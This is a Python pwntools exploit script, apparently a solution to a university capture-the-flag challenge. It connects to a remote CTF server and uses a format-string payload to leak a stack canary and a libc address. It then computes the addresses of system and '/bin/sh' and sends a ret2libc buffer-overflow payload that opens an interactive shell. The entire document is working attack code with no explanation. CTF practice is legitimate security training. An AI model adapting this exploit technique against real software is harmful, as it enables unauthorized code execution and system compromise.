#!/usr/bin/python3
from pwn import *

LOCAL = False

valueInTheMiddleLibc = 0xf7daa519
addressLib = 0xf7d89000
referenceLibOffset = valueInTheMiddleLibc - addressLib
systemLibOffset = 0x00048150
binShLibOffset = 0x1bd0f5

def sendMessage(p,message):
	p.recvuntil(b">")
	p.sendline(b"e")
	p.recvuntil(b"Insert your name (max 20 chars): ")
	p.sendline(message)
	answer = p.recvline()
	p.recvuntil(b"Insert your message: ")
	p.sendline(b"")
	
	return answer

if LOCAL:
	pause()
else:
	p = remote("ctf-fsi.fe.up.pt", 4002)

message1 = sendMessage(p, b"%8$x | %11$x")

canary, referenceVal = [int(val,16) for val in message1.split(b'|')] # integer number of the hexadecimal values specified in message1

libBase = referenceVal - referenceLibOffset
addressSystem = libBase + systemLibOffset
addressSH = libBase + binShLibOffset

message2 = flat(b"A" * 20, canary + 1, b"A" * 8, addressSystem, b"A" * 4, addressSH)

sendMessage(p,message2)

message3 = b"E"*19

sendMessage(p,message3)

p.interactive()
